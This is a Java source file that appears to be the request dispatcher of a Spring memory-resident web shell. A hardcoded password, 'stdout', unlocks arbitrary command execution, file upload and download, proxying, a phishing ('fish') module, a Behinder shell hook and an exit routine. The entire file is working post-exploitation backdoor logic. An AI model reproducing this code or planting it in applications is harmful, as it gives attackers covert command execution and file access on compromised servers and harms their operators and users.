package com.stdout.Utils;

import com.stdout.Models.BehinderShell;
import com.stdout.Models.FileManager;
import com.stdout.Utils.Redefine.MyRequest;

public class PreDoFilter {
    public static String PreDeal(Object request, Object response) throws Exception {
        String result = "";
        String uri = MyRequest.getRequestURI(request);

        result += com.stdout.Models.Fish.StaticFish(uri);
        if (result.length() != 0) {
            return result;
        }

        String password = MyRequest.getParameter(request, "password");

        if (password != null) {
            if (password.equals("stdout")) {
                String model = MyRequest.getParameter(request, "model");

                if (model.equals("help")) {
                    result += com.stdout.Models.Helper.help();
                }
                else if (model.equals("exec")) {
                    String cmd = MyRequest.getParameter(request, "cmd");
                    result += com.stdout.Models.CommandExecutor.exec(cmd);
                }
                else if (model.equals("fish")) {
                    String action = MyRequest.getParameter(request, "action");
                    if (action.equals("start")) {
                        String target = MyRequest.getParameter(request, "target");
                        String file = MyRequest.getParameter(request, "file");
                        result += com.stdout.Models.Fish.fishStart(target, file);
                    } else if (action.equals("stop")) {
                        result += com.stdout.Models.Fish.fishStop();
                    } else if (action.equals("show")) {
                        result += com.stdout.Models.Fish.fishShow();
                    }
                }
                else if (model.equals("proxy")) {
                    com.stdout.Models.SpringProxy.doProxy(request, response);
                    return null;
                }

                else if (model.equals("file")) {
                    String action = MyRequest.getParameter(request, "action");
                    if (action == null) {
                        result += FileManager.uploadView();
                    } else if (action.equals("download")) {
                        try {
                            String path = MyRequest.getParameter(request, "path");
                            FileManager.download(response, path);
                            return null;
                        } catch (Exception e) {
                            result += "need param: path";
                        }
                    } else if (action.equals("upload")) {
                        result += FileManager.upload(request);
                    }
                }

                else if (model.equals("Behinder")) {
                    Class<?> requestContextHolder = Class.forName("org.springframework.web.context.request.RequestContextHolder");
                    Object servlet = requestContextHolder.getDeclaredMethod("getRequestAttributes", null).invoke(null, null);
                    BehinderShell.run(servlet);
                }

                else if (model.equals("exit")) {
                    result += com.stdout.springMem.SpringMemModels.exit();
                }

                return result;
            }
        }


        return "";
    }
}
